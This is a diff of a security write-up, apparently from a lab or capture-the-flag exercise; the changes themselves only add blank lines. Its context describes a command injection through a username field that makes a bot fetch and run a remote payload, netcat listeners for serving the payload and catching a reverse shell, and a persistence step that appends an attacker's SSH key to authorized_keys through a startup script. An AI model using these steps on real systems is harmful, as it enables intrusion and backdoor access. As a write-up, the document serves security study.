@@ -58,6 +58,7 @@ The Attacker uses 2 netcat processes, one listening on 8080, the other on 8081.
 ![Nat Configuration](images/Nat_Configuration.png)
 
 #### Server process 1
+
 ```
 clear
 while true; do
@@ -65,6 +66,7 @@ nc -l -p 8080 -w 1 < response.txt
 done
 ```
 #### Server process 2
+
 ```
 clear
 nc -lvnp 8081
@@ -76,6 +78,7 @@ In the response.txt file there is the payload that the attacker wants to execute
 
 
 ## Exploit
+
 The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
 To work around this limitation, a remote listener was set up to serve the full payload.  
 The exploit injects a command in the username that makes the bot fetch and execute code from a remote `response.txt` file.  
@@ -177,10 +180,12 @@ The key's randomart image is:
 
 Then, I appended the generated public key to `user-b`'s `authorized_keys` by modifying `server_start.sh` as follows:
 
+
 ```
 echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92ZgdrAvfe0KavA4xA'
 >> /home/user-b/.ssh/authorized_keys" >> server_start.sh
 ```
+
 
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.
   
